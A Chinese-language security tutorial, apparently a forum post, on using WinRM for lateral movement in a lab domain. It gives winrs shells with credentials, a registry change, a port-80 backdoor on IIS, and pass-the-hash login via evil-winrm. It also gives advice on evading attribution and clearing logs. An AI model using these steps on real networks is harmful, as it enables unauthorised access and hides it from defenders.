一、什么是WinRM
----------

 WinRM是很早之前微软推出的一种新式的方便远程管理的服务Windows Remote Management的简称，相比RDP远程桌面协议，WinRM这种服务更具备轻量、低宽带的特性，WinRM与WinRS（Windows Remote Shell）的使用可以让远程连接的运维人员拥有CMDShell环境，通过命令执行对服务器与服务器数据进行管理。

 随着运维人员的任务量的增大，RDP的图形化界面让服务器管理更轻松，**WinRM在日常的使用中逐渐被淡化，在开启该服务时，防火墙默认放行5985端口，服务更所以在安全测试人员中，WinRM服务也成为常见的后渗透利用点之一**。

```php
Winrm服务默认端口：5985（HTTP）与 5986(HTTPS)
```

 但在 Win7、Win8、Win8.1、Win10 这些单机系统默认存在但没有正常启用WinRM服务，仍需要在本地进行命令执行进行配置，**而Server 2008/2008R2版本启用了WinRM服务，但服务配置不完整，仍需要对其进行快速配置才能正常使用。Server 2012及之后的版本才能直接正常使用**，文章以下操作都是以管理员Administrator权限进行操作。

```php
需要先配置才能使用的版本：
    Win7、Win8、Win8.1、Win10、Server 2008、Server 2008 R2
可以直接使用的版本：
    Server 2012/2012R2以及其更高版本
```

- - - - - -

二、WinRM远程连接操作
-------------

**测试环境：**

```php
测试主机 Windows 10教育版     192.168.52.132
目标主机 Windows 10教育版-克隆机     192.168.52.131   
```

在笔者测试的过程中，使用的是虚拟机的仅主机模式（Only host），无法配置WinRM服务（需要在专用网络或域网络中才能正常配置），所以说在这里笔者采用的方法是将两台主机加入到域环境中进行测试，可以有效解决这个问题。实战状况下是不用考虑这个问题的，可以正常操作WinRM服务。

![图片1.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-02837adb321e9ee1e533333c439ab9df8cf6eb7c.png)

###  利用条件

 **以下操作均以管理权限（SID 500）进行，无论是在Cobaltstrike、webshell终端下进行利用均可，并且在杀软、EDR不拦截cmd.exe、winrs.exe的情况下进行。**

 测试的两台主机由于都是Windows 10，该版本系统是需要进行WinRM服务配置之后才能正常的使用，为了更直观的学习与操作，这里将直接对两台机器进行配置操作，**而实战状况下要考虑到如何选择目标（不同版本系统的WinRM服务配置限制）或者如何去配置受控主机（Cobaltstrike、webshell条件下进行配置受控主机的WinRM服务去横向到内网中的其他机器）**。

- - - - - -

**在受控主机192.168.52.132 下进行配置：**

```php
命令：
    winrm quickconfig -q    #快速配置WinRM服务
    winrm set winrm/config/Client @{TrustedHosts="*"}     #信任任意连接主机
```

![图片2.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-85bf2d7b24410486b88aa8e9f2327d737c6fdbed.png)

目标系统主机192.168.52.131下的配置（如果是Server 2012可以直接使用，这里配置目标主机是为了演示操作）：

```php
命令：
    winrm quickconfig -q    #快速配置WinRM服务
```

![图片3.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-7fb243ebdbb90f072a8bf0b7e720dfcfe648c299.png)

测试是否可以使用命令操作（在操控主机下进行）

```php
命令：
    winrs -r:http://192.168.52.131:5985 -u:Administrator -p:Aa123456 ipconfig    #执行ipconfig命令
    winrs -r:http://192.168.52.131:5985 -u:Administrator -p:Aa123456 cmd.exe    #调用CMD命令行，获取交互Shell
```

![图片4.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-6a2da8c9b790cd1fbd74bbcd61eff57dce03f87e.png)

![图片5.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-023224e732de3d597df3ddccd734004db2bc18dd.png)

**笔者这里使用的是目标的Administrator用户，使用WinRM远程连接时还受到注册表中LocalAccountTokenFilterPolicy值（PTH也会受该值的影响）影响。**

在系统中，该LocalAccountTokenFilterPolicy的值默认为0，****在这种默认情况下，只有系统默认管理员账户Administrator（SID 500）拥有凭证可以进行对主机的连接，本地管理员组的其他用户登录时将会显示“拒绝访问”****，如果用其他本地管理员组的其他用户进行登录，我们还需要修改注册表中LocalAccountTokenFilterPolicy值为1，命令如下（在目标主机下执行）：

```php
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

**LocalAccountTokenFilterPolicy值为0时，管理员组用户Adminxd登录失败：**

![图片6.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-46e456093398f2b1e3a38fdc203c814184bf8d8c.png)

**LocalAccountTokenFilterPolicy值为1时，则登陆成功：**

![图片7.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-39f02b72fb08ea4e4b493d4eeadb1960165e866e.png)

![图片8.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-749c77722081c1c87e908f009b14aa32d6eca5d3.png)

- - - - - -

###  细节扩展

 **在域环境中，无论目标主机下LocalAccountTokenFilterPolicy的值是否为1，只要是域管理员都具有连接凭证，目标主机允许域管理对自己进行WinRM远程连接，还有一种情况就是普通域用户被管理员添加到本地管理员组，这时候就算值为0关闭状态，也可以默认bypassuac，拥有WinRM的远程连接凭证，可以成功连接**。

**尝试利用域管账户testadmin进行测试：**

![图片9.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-505203811ab580b0bfc17adc71251a41f1027b2e.png)

- - - - - -

三、WinRM端口复用后门的利用
----------------

###  原理

 该手法的原理是**WinRM远程连接服务结合服务容器IIS重要组成驱动HTTP.sys（负责处理HTTP协议相关数据），HTTP.sys可以提供Port Sharing端口共享的功能**，如果有其他服务是基于该驱动进行，则符合条件的服务可以与IIS服务器的WEB端的80端口进行共享，而WinRM服务就是在HTTP.sys上注册了wsman的URL前缀，WinRM服务默认端口为5985。

****注意：这里的利用前提是IIS服务器下，因为HTTP.sys只存在于IIS这个服务器容器类型中，可共享的是80端口，共享时不影响原80端口的WEB服务。****

- - - - - -

###  两种情况下的端口复用后门

```php
情况1：IIS服务器主机原本已经存在WinRM服务并开启默认端口5985的监听，为了隐匿性，而采用新增监听80端口。

情况2：IIS服务器主机未启用WinRM服务，为了隐匿性，将WinRM远程连接默认端口5985修改成80端口。
```

测试环境如下：

```php
    Windows Server 2008 R2 Datacenter
    Windows 10 教育版
```

![图片10.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-c7c325b8f40699bc4047042d34b65d0cc8b85678.png)

![图片11.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-a628330a6bcd6f1e7f029779d68a7094eb9cf236.png)

第一步、在利用端口复用后门之前，我们先对服务器进行信息收集，执行以下命令：

```php
    winrm e winrm/config/listener    #查看WinRM服务监听端口信息
    netsh http show servicestate    #查看在HTTP.sys驱动上注册的URL前缀
```

![图片12.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-bebc3bda6375e7fd87ce6b631d224af30adc7846.png)

![图片13.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-e28d0e4a273579bd15fc5a517525071d3d7ad580.png)

在Server 2008版本下，已经开启了IIS服务80端口但没有开启WinRM服务，此时我们将按照情况②的手法来预留端口复用后门，修改WinRM服务默认监听端口。

```php
#快速配置WinRM服务
    winrm quickconfig -q

#修改WinRM服务默认端口为80端口
    winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
```

![图片14.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-075262197f874f4b72d3b34d1ddf4f33854356d3.png)

![图片15.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-2a0ef6d3e8fadfa826a1a822eb3b1651fe498da2.png)

第二步、使用Win10对目标DC Win2008进行WinRM远程连接，这里用的是域管理账户，默认拥有整个域中的WinRM远程连接凭证。

```php
    winrm quickconfig -q    #快速配置WinRM服务
    winrm set winrm/config/Client @{TrustedHosts="*"}     #信任任意连接主机
    winrs -r:http://192.168.52.138:80 -u:god\liukaifeng01 -p:Aa123456 ipconfig
```

![图片16.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-c92ff735e87abef2d51c33196e989eaceb8c15ac.png)

另一种情况：**如果像Server 2012已经启用80端口与WinRM服务默认端口5985，为了隐匿性，我们可以新增一个WinRM监听80端口**，这时候我们可以通过80端口进行连接，避免连接5985端口引起不必要的注意。测试环境同样使用Server 2008主机（192.168.52.138）进行操作，思路不一样，可以慢慢思考琢磨一下。

假设，原先服务器已经启用了WinRM远程连接默认5985端口：

![图片17.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-1e4361d6ed231c277e125c4dd2a896b493948fa3.png)

新增一个WinRM服务监听80端口：

```php
命令：
    winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}    #新增监听80端口
```

![图片18.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-74b2fc7e283b86adfd55ad777730e10c6183ac96.png)

**新增监听80端口后，成功利用Win10进行远程连接目标80端口，5985端口与80端口都可以成功执行命令。**

![图片19.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-76080a568e47ed11739bd704473729081c605d9a.png)

- - - - - -

###  思路扩展（重点）

 在域中，域管理账户在域内主机中登录，会自动将域管用户添加到本地管理组中，如果是将普通域用户添加到系统本地管理员组，两种方法是默认bypassuac的，这时候域管理账户与普通域用户是拥有WinRM远程连接的凭证，无需要修改注册表就可以使用WinRM进行远程连接。

 所以说当我们在内网中进行喷洒密码成功或是说通过信息收集、记事本等手段收集到了域管理或域用户的账号密码时，如果面对3389未开启，psexec 和 wmi这些都被拦截了，满足WinRM的利用条件时，我们可以尝试使用WinRM进行横向，**当面对Server 2012以上时默认是启用这项服务的，端口复用后门也是一种常用的后门手段之一，具有一定的隐匿性，尤其是当对方IIS开启80端口时，跟IPC横向一样，在一些情况下具有奇效**。

 有些管理员会图方便管理，为了让资源更好的共享，将普通域用户加入到本地管理员组，这时候我们利用普通域用户可以成功执行WinRM连接。

 实际很多情况下，目标环境的域是有规划的部署，为了在域内更好的相互沟通，主机类型分为服务器与个人PC，每个员工都有自己独立的域用户账户（如域用户d01、d02）进行操作自己的个人PC（对应着域机器D01PC-Win10、D02PC-Win7），**这时候独立账户也是域用户，而域用户也在自己的个人PC上为管理员组账户，这时候我们获取某个独立账户的Hash或者明文，针对该用户的机器做权限维持的时候，可以考虑一直使用该独立账户进行操作WinRM**。因为该账户有较高的活跃性，可能会出现的意外较少（使用特殊账户，比如说：域管账户，很有可能会很快被溯源，而且该特殊账户很大的可能会被禁用或者重置，而个人独立账户的禁用或者重置还要考虑到主机上数据的备份等操作，可以给我们留更多的时间进行后续操作），比直接使用Administrator或者另类的用户进行操作WinRM的动静小。

**普通域用户testuser：**

![图片20.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-81df288bd7b46143b0bd2dfda942d463d3543476.png)

将普通域用户testuser添加到本地管理员组，并关闭除系统内置管理员账户Administrator之外的管理员用户进行WinRM远程连接。

![图片21.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-af96f36da6f82135135ec7939109cebe5b81ec0c.png)

再利用普通域用户testuser，发现回显成功执行

![图片22.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-5bd6ad405ab849e993a1923510e87a96cdf6a6cd.png)

- - - - - -

四、利用PTH进行连接WinRM
----------------

 在大部分环境下，因为系统高版本或密码安全性较高，通常出现只有凭证Hash但没办法快速获取明文密码的情况，这时候我们可以利用账户凭证Hash进行PTH来认证登录Winrm服务。由于系统内置工具Winrs.exe等不支持PTH方式的认证，所以说我们要另外去找其他替代工具进行使用。

```php
所使用项目：https://github.com/Hackplayers/evil-winrm
```

**该工具是用Ruby进行编写，可以实现WinRM的相关功能与系统操作，如：上传和下载文件、列出远程机器服务、加载Powershell脚本等等**。

这里用Kali Linux进行利用，将脚本克隆到本地，找到evil-winrm.rb工具本体，**这里首先需要安装该工具的依赖组件才能正常使用**。

```php
git clone https://github.com/Hackplayers/evil-winrm.git    #克隆项目
sudo gem install winrm winrm-fs colorize stringio          #安装依赖组件
```

![图片23.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-32a6a1924ad3d01deb69ee438d6ef954d5c8ddb7.png)

将所用测试Win10主机的WinRM服务快速配置一下，并将用户凭证Hash导出。

![图片24.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-7d0afc128c51f45b36252c07c9c96ab7f0826a23.png)

![图片25.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-875ce94c6ec01186094d71328f82b811d54ad44c.png)

查看工具帮助菜单，查看简介选择所需的参数

![图片26.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-fae6cbb542448872ce530c593c4677e34c7585ed.png)

利用哈希对目标Winrm服务进行连接，成功获取交互Shell

```php
./evil-winrm.rb -i 192.168.128.128 -u Administrator -H 47bf8039a8506cd67c524a03ff84ba4e
```

![图片27.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-4ab3114669f3c375bdf45b1549d0861885972977.png)

- - - - - -

###  思路扩展

 ****Winrs.exe是微软Windows系统下内置的管理Winrm工具，无论是建立连接从地到远程目标机器，还是从远程到本地，Windows Defender都不会进行拦截。****

 在域环境下，存在Server 2012以及2012+系统版本的机器，当我们成功获取拥有Winrm权限的账户（如域管、机器本地管理组的某个域用户等等），目标主机中只开启Defender并且IPC、RDP无法正常使用的时候可以考虑使用该手法进行横向，默认情况下这些系统版本可以直接进行Winrm的连接去获取一个交互Shell，并且权限较高可以修改大部分配置，管理员权限的CMD能做的，在该Winrm交互环境下绝大多数也可以做，环境执行限制较少，****但该手法会留下较多的日志，测试完毕的时候需要考虑痕迹清理。****

- - - - - -

文章相关快速利用笔记已经上传到公众号资料网盘（持续更新中）

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-791d2aafa78491cd3046c903f92e887354c9491e.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-8407484e4fc5456166dbaf417df6d37fb5127474.png)